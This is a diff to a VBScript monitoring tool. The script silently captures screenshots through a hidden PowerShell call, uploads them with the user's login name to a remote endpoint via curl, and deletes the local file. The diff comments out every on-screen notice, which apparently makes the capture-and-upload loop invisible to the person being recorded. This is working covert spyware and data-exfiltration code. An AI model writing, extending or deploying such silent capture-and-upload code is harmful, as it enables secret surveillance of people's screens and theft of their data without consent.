@@ -36,7 +36,7 @@ sub GetPermissions()
 	 ' Check if there was an error during the request
     If Err.Number <> 0 Then
         ' Display detailed error information
-        WScript.Echo "Error connecting to the server. Details: " & Err.Description
+        'WScript.Echo "Error connecting to the server. Details: " & Err.Description
         Err.Clear  ' Clear the error object
 		GetPermissions
         Exit Sub
@@ -44,19 +44,19 @@ sub GetPermissions()
 	
 	 ' Check if there was an error during the request
     If objHTTP.Status <> 200 Then
-        WScript.Echo "Error connecting to the server. Status code: " & objHTTP.Status
+        'WScript.Echo "Error connecting to the server. Status code: " & objHTTP.Status
 		GetPermissions
         Exit Sub
     End If
 	
 	' Display the response from the server
-	WScript.Echo "Response from server: " & objHTTP.responseText  
+	'WScript.Echo "Response from server: " & objHTTP.responseText  
 	
 	If objHTTP.responseText = "true" Then
-		WScript.Echo "Permissions granted!"
+		'WScript.Echo "Permissions granted!"
     Else
-        WScript.Echo "Permissions denied!"
-		WScript.Sleep 1800000 ' wait for 30 minutes
+        'WScript.Echo "Permissions denied!"
+		'WScript.Sleep 1800000 ' wait for 30 minutes
 		GetPermissions
 	End If
 	
@@ -71,9 +71,9 @@ sub CheckInternetConnection()
     objHTTP.send ""
     On Error GoTo 0
     If objHTTP.status = 200 Then
-        WScript.Echo "Internet is connected!"
+        'WScript.Echo "Internet is connected!"
     Else
-		WScript.Echo "Internet is not connected!"
+		'WScript.Echo "Internet is not connected!"
 		WScript.Sleep 3000
 		CheckInternetConnection
     End If
@@ -89,18 +89,18 @@ sub CaptureScreenshot()
 												"Remove-Variable -Name image"
     
     objShell.Run "powershell.exe -Command """ & powershellCommand & """", 0, True ' Execute the PowerShell command
-    WScript.Echo "Screenshot Captured and saved at " & outputDirectory & "\" & filename ' Display messages
+    'WScript.Echo "Screenshot Captured and saved at " & outputDirectory & "\" & filename ' Display messages
     Set objShell = Nothing
 End sub
 
 Sub UploadImage()
 	Dim objNetwork : Set objNetwork = CreateObject("WScript.Network")
     Dim clientName : clientName = objNetwork.UserName
-    WScript.Echo "Uploading Screenshot..."
+    'WScript.Echo "Uploading Screenshot..."
     Dim curlCommand : curlCommand = "curl -X POST " & apiEndpoint & " -H ""Content-Type: multipart/form-data"" -F ""image=@" & imagePath & """ -F ""clientName=" & clientName & """"
     Dim shell : Set shell = CreateObject("WScript.Shell") ' Create a WScript.Shell object
     shell.Run curlCommand, 0, True ' Run the curl command
-	WScript.Echo "Uploaded..."
+	'WScript.Echo "Uploaded..."
     
 	Set objNetwork = Nothing    ' Release the object
 	Set shell = Nothing         ' Release the shell object
@@ -110,9 +110,9 @@ Sub DeleteFile()
 	Dim objFSO : Set objFSO = CreateObject("Scripting.FileSystemObject") 	' Create a FileSystemObject
     If objFSO.FileExists(imagePath) Then 									' Check if the file exists before attempting to delete
         objFSO.DeleteFile imagePath 										' Delete the file
-        WScript.Echo "File deleted successfully."
+        'WScript.Echo "File deleted successfully."
     Else
-        WScript.Echo "File not found."
+        'WScript.Echo "File not found."
     End If
 	Set objFSO = Nothing 												    ' Release the FileSystemObject
 End Sub
